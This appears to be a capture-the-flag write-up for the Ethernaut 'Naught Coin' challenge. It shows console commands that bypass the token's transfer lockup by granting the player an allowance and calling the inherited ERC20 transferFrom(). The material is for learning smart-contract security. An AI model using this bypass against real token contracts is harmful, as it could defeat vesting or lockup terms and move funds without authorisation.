# Naught Coin

## Description

Because NaughtCoin inherits from ERC20, it has more functions then the ones
visible in the smart contract. By decompiling it in etherscan or by going to
OpenZeppelin's docs, we discover the function `transferFrom()` which allows us
to send the value away from our account without using the `transfer()` function.

## Command Sequence

```
> await contract.allowance(player, player)
0
> const balance = contract.balanceOf(player)
> await contract.increaseAllowance(player, balance)
> await contract.allowance(player, player)
balance
> await contract.transferFrom(player, instance, balance)
> await contract.balanceOf(player)
0
```
